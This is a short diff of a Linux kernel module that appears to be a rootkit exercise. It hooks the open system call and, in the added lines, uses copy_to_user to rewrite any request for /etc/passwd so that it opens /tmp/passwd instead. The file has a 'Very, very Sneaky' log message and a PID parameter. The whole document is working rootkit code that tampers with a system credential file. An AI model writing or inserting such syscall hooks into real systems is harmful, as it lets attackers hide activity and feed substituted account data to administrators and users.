@@ -25,7 +25,7 @@ Third param is permission bits
 */
 
 static int myPID = 999;
-char tmp[1000];
+char* sneaky_path = "/tmp/passwd";
 
 module_param(myPID, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
 
@@ -54,6 +54,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
   printk(KERN_INFO "Very, very Sneaky!\n");
   if(strcmp(pathname, "/etc/passwd") == 0){
     printk(KERN_INFO "/etc/passwd detected\n");
+    copy_to_user((void*)pathname, sneaky_path, strlen(sneaky_path));
   }
 
   return original_call(pathname, flags);
